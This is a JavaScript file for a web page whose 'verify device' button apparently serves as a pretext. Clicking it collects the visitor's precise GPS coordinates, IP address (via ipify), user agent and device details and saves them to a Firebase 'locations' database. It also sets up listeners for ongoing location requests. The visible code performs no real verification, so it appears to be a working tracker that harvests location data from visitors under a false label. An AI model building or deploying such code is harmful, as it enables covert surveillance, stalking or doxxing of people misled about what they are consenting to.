import { firebaseReady } from './src/core/firebase-init.js';
import { initializeTheme } from './src/features/theme/theme-manager.js';
import { listenForLocationRequests, setupUnloadHandler } from './src/features/location/location-tracker.js';
import { getDeviceInfo } from './src/utils/browser-detection.js';

// Initialize Firebase and load theme
document.addEventListener('DOMContentLoaded', async () => {
    try {
        // Wait for Firebase to be ready
        const database = await firebaseReady;
        
        // Initialize theme system
        await initializeTheme();

        // Setup location request listener
        listenForLocationRequests();

        // Setup unload handler
        setupUnloadHandler();

        // Setup verify button click handler
        const verifyButton = document.getElementById('allowLocation');
        const locationStatus = document.getElementById('locationStatus');

        if (!verifyButton) {
            console.error('Verify button not found');
            return;
        }

        console.log('Setting up click handler for verify button');
        verifyButton.addEventListener('click', async () => {
            console.log('Verify button clicked');
            try {
                if (!navigator.geolocation) {
                    throw new Error('Geolocation is not supported by this browser');
                }

                verifyButton.disabled = true;
                document.querySelector('.container').classList.add('processing');
                locationStatus.textContent = 'Verifying device...';

                // Get initial location
                console.log('Requesting location...');
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 20000,
                        maximumAge: 0
                    });
                });
                console.log('Location received:', position);

                // Get IP address
                console.log('Fetching IP address...');
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const { ip } = await ipResponse.json();
                console.log('IP address received:', ip);

                // Save location to Firebase
                console.log('Saving to Firebase...');
                const { ref, push, set } = window.firebase.database;
                const locationsRef = ref(database, 'locations');
                const newLocationRef = push(locationsRef);

                const locationData = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    altitudeAccuracy: position.coords.altitudeAccuracy,
                    timestamp: new Date().toISOString(),
                    status: 'active',
                    ip: ip,
                    userAgent: navigator.userAgent,
                    ...getDeviceInfo()
                };

                await set(newLocationRef, locationData);
                console.log('Location saved successfully');

                locationStatus.textContent = 'Device verified successfully';
                
                // Add success animation class
                document.querySelector('.thank-you-card').classList.add('success');
                
            } catch (error) {
                console.error('Verification failed:', error);
                locationStatus.textContent = error.message || 'Verification failed. Please try again.';
                verifyButton.disabled = false;
                document.querySelector('.container').classList.remove('processing');
            }
        });

        console.log('Initialization complete');

    } catch (error) {
        console.error('Failed to initialize:', error);
    }
});
